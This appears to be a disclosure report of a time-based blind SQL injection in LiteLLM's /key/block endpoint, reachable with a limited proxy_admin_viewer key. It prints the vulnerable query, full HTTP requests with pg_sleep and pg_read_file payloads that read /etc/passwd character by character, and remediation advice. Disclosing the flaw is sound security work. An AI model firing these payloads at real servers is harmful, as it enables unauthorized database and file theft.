# litellm_sql_injection

BUG_Author: shadia0

Affected version: litellm latest version and before

Project Link: [https://github.com/elunez/eladmin](https://github.com/BerriAI/litellm)

URL: /key/block

Parameter: "key"(POST)

# Description
There is sql injection in this endpoint `/key/block`. A proxy_admin_viewer API key can also achieve arbitrary file reading on the server.

This code exhibits a vulnerability. If `token` variable contain malicious data, it can lead to a SQL Injection, which could further enable a Local File Read.
```
sql_query = f"""
SELECT 
v.*,
t.spend AS team_spend, 
t.max_budget AS team_max_budget, 
t.tpm_limit AS team_tpm_limit,
t.rpm_limit AS team_rpm_limit,
t.models AS team_models,
t.metadata AS team_metadata,
t.blocked AS team_blocked,
t.team_alias AS team_alias,
t.metadata AS team_metadata,
t.members_with_roles AS team_members_with_roles,
tm.spend AS team_member_spend,
m.aliases as team_model_aliases
FROM "LiteLLM_VerificationToken" AS v
LEFT JOIN "LiteLLM_TeamTable" AS t ON v.team_id = t.team_id
LEFT JOIN "LiteLLM_TeamMembership" AS tm ON v.team_id = tm.team_id AND tm.user_id = v.user_id
LEFT JOIN "LiteLLM_ModelTable" m ON t.model_id = m.id
WHERE v.token = '{token}'
"""
```

The proxy_admin can create proxy_admin_viewer accounts via "Invite User," as documented at LiteLLM Documentation. According to specifications:

Proxy Admin: Can create keys, teams, users, add models, etc.

Proxy Admin Viewer: Can just view spend. They cannot create keys, teams or grant users access to new models.

So the proxy_admin_viewer has limited permissions and cannot be the server's super administrator.

 # Proof of Concept
1. Login into admin panel with username `admin` and password `sk-1234`.
2. Create a Proxy Admin Viewer account.
3. Generate a Proxy Admin Viewer API key. 
4. Send the following POC to the `/key/block`. You can see that it sleeps for 5 seconds. This demonstrates the existence of a time-based SQL injection here.
5. Using this key to perform a delayed SQL injection, the subsequent operations are the same as I initially mentioned, allowing arbitrary database reading and server file access, which can lead to sensitive information leakage and server compromise.
```
POST /key/block HTTP/1.1
Host: 127.0.0.1:4000
Content-Length: 115
Authorization: Bearer sk-5pUqaVXkY6DaR1zEKKnwwA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: application/json
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
  "key": "1'||pg_sleep(5); -- -"
}
```
3. Modify the POC, using the `pg_read_file()` function and time delay to read the contents of the `/etc/passwd` file. The response will only be delayed when the character matches.
```
POST /key/block HTTP/1.1
Host: 127.0.0.1:4000
Content-Length: 115
Authorization: Bearer sk-5pUqaVXkY6DaR1zEKKnwwA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: application/json
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
  "key": "1'|| CASE WHEN pg_read_file('/etc/passwd', 0, 1) = 'r' THEN pg_sleep(10) ELSE pg_sleep(0) END; -- -"
}                
```
Send the request packet to Burp Intruder, modify the offset of the `pg_read_file()` function, then iterate through all characters for matching. Identify the character that causes a delayed response. The following image proves that the first two characters of `/etc/passwd` are 'r' and 'o'. By using this method, you can obtain the entire content of the file.

<img width="1346" alt="1221741188004_ pic" src="https://github.com/user-attachments/assets/1e922130-a0ed-4c21-b07f-cbe32da1a913" />

<img width="1262" alt="1211741187925_ pic" src="https://github.com/user-attachments/assets/e0ffdd38-fea0-49cf-98d3-0e6922b6c7cc" />

<img width="1262" alt="1241741190564_ pic" src="https://github.com/user-attachments/assets/9f9d79b7-daca-4c31-b5ea-a60fd173783d" />

# Remediation Recommendations
As the latest version of LiteLLM still has not fixed this vulnerability, we recommend the following measures:

1. Replace string formatting with parameterized queries to prevent SQL injection
2. Implement proper input validation and sanitization before processing any user-provided data in database queries.
3. If using an ORM framework, leverage its built-in security features instead of writing raw SQL queries.

